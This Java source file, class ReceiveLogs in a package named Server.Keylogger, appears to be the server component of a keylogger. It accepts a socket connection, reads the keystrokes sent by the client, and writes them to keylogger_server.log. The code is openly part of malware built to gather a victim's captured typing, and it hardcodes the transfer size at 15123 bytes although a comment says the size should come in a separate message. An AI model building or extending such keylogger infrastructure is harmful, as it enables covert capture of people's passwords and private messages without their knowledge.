package Server.Keylogger;

import java.io.DataInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;

public class ReceiveLogs extends Thread {

    Socket socket;

    /*
     * Constructor of the class RecieveLogs
     *
     * Parameters: socket
     *
     * Parameter Type:socket->Socket
     */
    public ReceiveLogs(Socket socket) {
        this.socket = socket;
    }

    // run the thread
    // Recieves then KeyStrokes made by the client
    public void run() {
        DataInputStream dataInput;

        // Handles the Exception caused by getInputStream
        try {
            dataInput = new DataInputStream(socket.getInputStream());

            FileOutputStream fileOutput = new FileOutputStream("keylogger_server.log");
            byte[] buffer = new byte[4096];

            int filesize = 15123; // Send file size in separate msg
            int read = 0;
            int totalRead = 0;
            int remaining = filesize;
            while ((read = dataInput.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
                totalRead += read;
                remaining -= read;
                System.out.println("read " + totalRead + " bytes.");
                fileOutput.write(buffer, 0, read);
            }

            fileOutput.close();
            dataInput.close();
        } catch (IOException e) {

            e.printStackTrace();
        }
    }

}
